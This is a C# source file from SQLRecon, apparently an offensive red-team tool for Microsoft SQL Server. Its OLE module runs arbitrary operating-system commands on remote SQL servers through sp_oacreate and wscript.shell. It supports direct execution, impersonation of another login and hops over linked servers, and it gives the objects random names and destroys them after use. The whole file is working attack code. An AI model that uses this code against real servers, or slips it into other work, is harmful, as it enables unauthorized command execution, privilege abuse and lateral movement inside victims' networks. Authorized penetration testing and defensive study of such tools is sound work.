using System.Data.SqlClient;
using SQLRecon.Utilities;

namespace SQLRecon.Modules
{
    internal class OLE
    {
        private static readonly Configure _config = new();
        private static readonly PrintUtils _print = new();
        private static readonly RandomString _rs = new();
        private static readonly SqlQuery _sqlQuery = new();

        /// <summary>
        /// The Standard method will create a OLE object on a remote SQL
        /// server and use wscript.shell to execute an arbitrary command.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="command"></param>
        public void Standard(SqlConnection con, string command)
        {
            // First check to see if ole automation procedures is enabled.
            string sqlOutput = _config.ModuleStatus(con,"Ole Automation Procedures");

            if (!sqlOutput.Contains("1"))
            {
                _print.Error("You need to enable OLE Automation Procedures (enableole).", true);
                // Go no futher.
                return;
            }

            // Generate a new random output and program name.
            string output = _rs.Generate(8); 
            string program = _rs.Generate(8);

            _print.Status(string.Format("Setting sp_oacreate to '{0}'.", output), true);
            _print.Status(string.Format("Setting sp_oamethod to '{0}'.", program), true);

            sqlOutput = _sqlQuery.ExecuteQuery(con, "DECLARE @" + output + " INT; " +
                "DECLARE @" + program + " VARCHAR(255);" +
                "SET @" + program + " = 'Run(\"" + command + "\")';" +
                "EXEC sp_oacreate 'wscript.shell', @" + output + " out;" +
                "EXEC sp_oamethod @" + output + ", @" + program + ";" +
                "EXEC sp_oadestroy @" + output + ";");

            _printStatus(output, program, sqlOutput);
        }

        /// <summary>
        /// The Impersonate method will create a OLE object on a remote SQL
        /// server and use wscript.shell to execute an arbitrary command using
        /// impersonation.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="cmd"></param>
        /// <param name="impersonate"></param>
        public void Impersonate(SqlConnection con, string cmd, string impersonate = "null")
        {
            // First check to see if ole automation procedures is enabled.
            string sqlOutput = _config.ModuleStatus(con, "Ole Automation Procedures", impersonate);
            if (!sqlOutput.Contains("1"))
            {
                _print.Error("You need to enable OLE Automation Procedures (ienableole).", true);
                // Go no futher.
                return;
            }

            // Generate a new random output and program name.
            string output = _rs.Generate(8);
            string program = _rs.Generate(8);

            _print.Status(string.Format("Setting sp_oacreate to '{0}'.", output), true);
            _print.Status(string.Format("Setting sp_oamethod to '{0}'.", program), true);

            sqlOutput = _sqlQuery.ExecuteImpersonationQuery(con, impersonate, 
                "DECLARE @" + output + " INT; " +
                "DECLARE @" + program + " VARCHAR(255);" +
                "SET @" + program + " = 'Run(\"" + cmd + "\")';" +
                "EXEC sp_oacreate 'wscript.shell', @" + output + " out;" +
                "EXEC sp_oamethod @" + output + ", @" + program + ";" +
                "EXEC sp_oadestroy @" + output + ";");

            _printStatus(output, program, sqlOutput);
        }

        /// <summary>
        /// The Linked method will create a OLE object on a remote linked SQL
        /// server and use wscript.shell to execute an arbitrary command.
        /// <param name="con"></param>
        /// <param name="cmd"></param>
        /// <param name="linkedSqlServer"></param>
        public void Linked(SqlConnection con, string cmd, string linkedSqlServer)
        {
            // First check to see if ole automation procedures is enabled.
            string sqlOutput = _config.LinkedModuleStatus(con, "Ole Automation Procedures", linkedSqlServer);

            if (!sqlOutput.Contains("1"))
            {
                _print.Error("You need to enable OLE Automation Procedures (lenableole).", true);
                // Go no futher.
                return;
            }

            // Generate a new random output and program name.
            string output = _rs.Generate(8);
            string program = _rs.Generate(8);

            _print.Status(string.Format("Setting sp_oacreate to '{0}'.", output), true);
            _print.Status(string.Format("Setting sp_oamethod to '{0}'.", program), true);

            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer, "select 1; " +
                "DECLARE @" + output + " INT; " +
                "DECLARE @" + program + " VARCHAR(255);" +
                "SET @" + program + " = ''Run(\"" + cmd + "\")'';" +
                "EXEC sp_oacreate ''wscript.shell'', @" + output + " out;" +
                "EXEC sp_oamethod @" + output + ", @" + program + ";" +
                "EXEC sp_oadestroy @" + output + ";");

            _printStatus(output, program, sqlOutput);
        }

        /// <summary>
        /// The _printStatus method will display the status of the 
        /// OLE command execution.
        /// </summary>
        /// <param name="output"></param>
        /// <param name="program"></param>
        /// <param name="sqlOutput"></param>
        private void _printStatus (string output, string program, string sqlOutput)
        {
            if (sqlOutput.Contains("0"))
            {
                _print.Success(string.Format("Executed command. Destroyed '{0}' and '{1}'.", output, program), true);
            }
            else if (sqlOutput.Contains("permission"))
            {
                _print.Error("The current user does not have permissions to enable OLE Automation Procedures.", true);
            }
            else if (sqlOutput.Contains("blocked"))
            {
                _print.Error("You need to enable OLE Automation Procedures.", true);
            }
            else
            {
                _print.Error(string.Format("{0}.", sqlOutput), true);
            }
        }
    }
}